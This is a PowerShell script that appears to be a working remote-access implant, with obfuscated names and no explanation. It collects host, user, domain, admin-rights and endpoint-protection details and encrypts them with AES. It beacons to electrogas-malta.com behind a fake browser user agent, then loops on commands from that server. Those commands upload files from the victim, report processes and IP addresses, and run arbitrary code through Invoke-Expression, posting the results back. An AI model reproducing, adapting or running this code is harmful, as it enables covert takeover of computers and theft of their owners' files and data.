$HKYX = 5;
$XSY = "SUlPRkxCWFdFU0FBWkNHSUhHRkhVRU1CTkJKSkdFVFU=";
$KBRBL = "T0pJRVBaT1hWUllSSlRORA=="

function WYRS($XSY, $KBRBL) {
    $SG = New-Object "System.Security.Cryptography.AesManaged"
    $SG.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $SG.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $SG.BlockSize = 128
    $SG.KeySize = 256
    if ($KBRBL) {
        if ($KBRBL.getType().Name -eq "String") {
            $SG.IV = [System.Convert]::FromBase64String($KBRBL)
        }
        else {
            $SG.IV = $KBRBL
        }
    }
    if ($XSY) {
        if ($XSY.getType().Name -eq "String") {
            $SG.Key = [System.Convert]::FromBase64String($XSY)
        }
        else {
            $SG.Key = $XSY
        }
    }
    $SG
}

function LFRTNPQZ($XSY, $KBRBL, $unencryptedString) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $SG = WYRS $XSY $KBRBL
    $YQUCVH = $SG.CreateEncryptor()
    $encryptedData = $YQUCVH.TransformFinalBlock($bytes, 0, $bytes.Length);
    [System.Convert]::ToBase64String($encryptedData)
}

function HZHDF($XSY, $KBRBL, $cipher) {
    $bytes = [System.Convert]::FromBase64String($cipher)
    $SG = WYRS $XSY $KBRBL
    $decryptor = $SG.CreateDecryptor();
    $TRY = $decryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [System.Text.Encoding]::UTF8.GetString($TRY).Trim([char]0)
}


$progressPreference = 'silentlyContinue';
$wc = New-Object system.Net.WebClient;
$wc2 = New-Object system.Net.WebClient;
$wcr = New-Object system.Net.WebClient;
$hostname = $env:COMPUTERNAME;
$KYOEJS = LFRTNPQZ $XSY $KBRBL $hostname
$ZZSP = -join ((65..90) | Get-Random -Count 5 | % {[char]$_});
$r2 = $ZZSP;
$DRKOOHMBV = "$hostname-$r2";
$BEPSNQJJG = $env:USERNAME;
$whmenc = LFRTNPQZ $XSY $KBRBL $BEPSNQJJG
$TFZPAULQG = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
$LIKCZRJ = (Get-WmiObject -class Win32_OperatingSystem).Caption + "($TFZPAULQG)";
$VPVIAUXK = (Get-WmiObject Win32_ComputerSystem).Domain;


$procarch = [Environment]::Is64BitProcess
$procarchf = ""
if ($procarch -eq "True"){$procarchf = "x64"}else{$procarchf="x86"}

$pn = Get-Process -PID $PID | % {$_.ProcessName}; $pnid = $pn + " ($pid) - $procarchf"

$user_identity = [Security.Principal.WindowsIdentity]::GetCurrent();
$iselv = (New-Object Security.Principal.WindowsPrincipal $user_identity).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)

if($iselv){
$BEPSNQJJG = $BEPSNQJJG + "*"
}

$random = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Advanced Threat Protection\Status" -Name OnboardingState -ErrorAction SilentlyContinue).OnboardingState;if($random -eq $null){$atp = $false}else{$atp = $true}
$raw_header = "$DRKOOHMBV,$BEPSNQJJG,$LIKCZRJ,$pnid,$VPVIAUXK,$atp";
$encrypted_header = LFRTNPQZ $XSY $KBRBL $raw_header;
$final_hostname_encrypted = LFRTNPQZ $XSY $KBRBL $DRKOOHMBV

$wch = $wc.headers;
$wch.add("Authorization", $encrypted_header);
$wch.add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");

$wc.downloadString("https://electrogas-malta.com:443/login");
$failure_counter = 0;
while($true){

    try{
    $command_raw = $wc2.downloadString("https://electrogas-malta.com:443/view/$DRKOOHMBV");
    }catch{
    $failure_counter=$failure_counter +1;
    if ($failure_counter -eq 10){
    kill $pid
    }
    }

    #$final_command = HZHDF $XSY $KBRBL $command_raw
    #$fc = $final_command.Trim([char]0).Trim([char]1).Trim([char]1).Trim([char]2).Trim([char]3).Trim([char]4).Trim([char]5).Trim([char]6).Trim([char]7).Trim([char]8).Trim([char]9).Trim([char]10).Trim([char]11).Trim([char]12).Trim([char]13).Trim([char]14).Trim([char]15).Trim([char]16).Trim([char]17).Trim([char]18).Trim([char]19).Trim([char]20).Trim([char]21)
    $fc = $command_raw;
    if(($fc -eq "") -Or ($fc -eq "False") ){

    } elseif($fc -eq "Report"){
      $ps = foreach ($i in Get-Process){$i.ProcessName};
      $local_ips = (Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected" }).IPv4Address.IPAddress;$arr = $local_ips.split("\n");
      $ps+= $arr -join ";"
      $ps+= (Get-WmiObject -Class win32_operatingSystem).version;
      $ps+= (Get-WinSystemLocale).Name
      $ps+= ((get-date) - (gcim Win32_OperatingSystem).LastBootUpTime).TotalHours
      $ps+= Get-Date -Format "HH:mm(MM/dd/yyyy)"
      $pst = LFRTNPQZ $XSY $KBRBL $ps
      $wcrh = $wcr.Headers;
      $wcrh.add("Authorization", $pst);
      $wcrh.add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");
      $wcrh.add("App-Logic", $KYOEJS);
      $wcr.downloadString("https://electrogas-malta.com:443/calls");
    } elseif($fc.split(" ")[0] -eq "Download"){
        $filename = LFRTNPQZ $XSY $KBRBL $fc.split("\")[-1]
        $file_content = [System.IO.File]::ReadAllBytes($fc.split(" ")[1])
        $RDQ = [Convert]::ToBase64String($file_content);
        $efc = LFRTNPQZ $XSY $KBRBL $RDQ;
        $ANMQWDRI = new-object net.WebClient;
        $T = $ANMQWDRI.Headers;
        $T.add("Content-Type", "application/x-www-form-urlencoded");
        $T.add("x-Authorization", $whmenc);
        $ANMQWDRI.UploadString("https://electrogas-malta.com:443/messages", "fn=$filename&amp;token=$efc");
    } elseif($fc -eq "reset-ps"){
        try{
        # Reset Powershell session (clean)
        # NOT IMPLEMENTED YET
        $ec = "NO";
        }
        catch{
        $ec = $Error[0] | Out-String;
        }

        $RDQ = LFRTNPQZ $XSY $KBRBL $ec;
        $ANMQWDRI = New-Object system.Net.WebClient;
        $ANMQWDRI.Headers["App-Logic"] = $final_hostname_encrypted;
        $ANMQWDRI.Headers["Authorization"] = $RDQ;
        $ANMQWDRI.Headers["Session"] = $command_raw;
        $ANMQWDRI.downloadString("https://electrogas-malta.com:443/bills");
    } else{
      try{
        #Write-Host "Executing command";
        #Write-Host $fc;
        #$ec = IEX($fc);
	$ec = Invoke-Expression ($fc) | Out-String;
        #Write-Host "Result:";
	#Write-Host $ec;
        }
        catch{
        $ec = $Error[0] | Out-String;
        }
	$ecbytes = [System.Text.Encoding]::UTF8.GetBytes($ec);
        $RDQ = [System.Convert]::ToBase64String($ecbytes);
	$UrlRDQ = $RDQ.replace('=','%3D');	
        
	$ANMQWDRI = New-Object system.Net.WebClient;
        $ANMQWDRI.Headers["App-Logic"] = $final_hostname_encrypted;
        $ANMQWDRI.Headers["Authorization"] = "rGa4AGAMDSFAS34eaTfx";
	$ANMQWDRI.Headers["Session"] = $command_raw;
	$ANMQWDRI.UploadString("https://electrogas-malta.com:443/bills", "test=" + $UrlRDQ);

        #$ANMQWDRI.downloadString("https://electrogas-malta.com:443/bills");
    }

    sleep $HKYX;
    }
</body></html>
